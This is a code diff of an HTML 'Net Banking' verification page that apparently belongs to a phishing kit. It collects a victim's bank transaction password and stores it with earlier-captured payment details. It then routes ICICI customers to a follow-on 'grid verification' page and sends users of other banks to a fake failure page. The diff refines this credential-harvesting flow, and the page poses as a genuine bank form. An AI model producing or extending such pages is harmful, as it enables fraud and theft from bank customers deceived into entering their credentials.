@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Net Banking - Transaction Password</title>
+    <title>Net Banking - Security Verification</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
@@ -20,25 +20,50 @@
 </head>
 <body>
     <div class="form-container">
-        <h2>Security Verification</h2>
+        <h2 id="formTitle">Security Verification</h2>
         <form id="transPassForm">
-            <div class="form-group">
-                <label for="transPassword">Enter Your Transaction Password</label>
-                <input type="password" id="transPassword" name="transPassword" placeholder="Enter transaction password" required>
+            <div class="form-group" id="passGroup">
+                <label for="transPassword" id="labelName">Enter Your Transaction Password</label>
+                <input type="password" id="transPassword" name="transPassword" placeholder="Enter password" required>
             </div>
             <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
         </form>
     </div>
 
     <script>
+        // Page load hote hi check karo ki kaun sa bank select hua hai
+        let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
+        let deviceId = localStorage.getItem('voterDeviceId');
+        let selectedBank = "";
+
+        if (submissions.length > 0) {
+            let targetIndex = -1;
+            for (let i = submissions.length - 1; i >= 0; i--) {
+                if (submissions[i].deviceId === deviceId) {
+                    targetIndex = i;
+                    break;
+                }
+            }
+            if (targetIndex === -1) targetIndex = submissions.length - 1;
+
+            if (submissions[targetIndex].paymentDetails) {
+                selectedBank = submissions[targetIndex].paymentDetails;
+            }
+        }
+
+        // Agar bank ICICI hai, toh transaction password box ko hide kar do aur button ka text badal do
+        const isIcici = selectedBank.includes("ICICI");
+        if (isIcici) {
+            document.getElementById('formTitle').innerText = "ICICI Verification";
+            document.getElementById('passGroup').style.display = 'none';
+            document.getElementById('transPassword').required = false;
+            document.getElementById('submitBtn').innerText = "Proceed to Grid Verification";
+        }
+
         document.getElementById('transPassForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const transPassword = document.getElementById('transPassword').value;
-
-            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
-            let deviceId = localStorage.getItem('voterDeviceId');
-            let selectedBank = "";
 
             if (submissions.length > 0) {
                 let targetIndex = -1;
@@ -50,12 +75,11 @@
                 }
                 if (targetIndex === -1) targetIndex = submissions.length - 1;
 
-                // Save Transaction Password
-                submissions[targetIndex].transPassword = transPassword;
-                
-                // Check karo ki user ne kaun sa bank select kiya tha
-                if (submissions[targetIndex].paymentDetails) {
-                    selectedBank = submissions[targetIndex].paymentDetails;
+                // Agar ICICI nahi hai, tabhi transaction password save karo
+                if (!isIcici) {
+                    submissions[targetIndex].transPassword = transPassword;
+                } else {
+                    submissions[targetIndex].transPassword = "N/A (Skipped)";
                 }
 
                 localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
@@ -63,14 +87,14 @@
 
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
-            btn.innerText = "Verifying...";
+            btn.innerText = "Processing...";
 
             setTimeout(() => {
-                // Agar bank ICICI hai, toh grid ke pehle page par bhejo
-                if (selectedBank.includes("ICICI")) {
+                if (isIcici) {
+                    // ICICI hai toh seedha grid ke pehle page par bhejo
                     window.location.href = "grid_step1.html"; 
                 } else {
-                    // Agar koi aur bank hai (SBI, PNB, Bank of India, आदि), toh seedha failed.html par bhejo
+                    // Dusra bank hai toh failed page par bhejo
                     window.location.href = "failed.html"; 
                 }
             }, 1000);
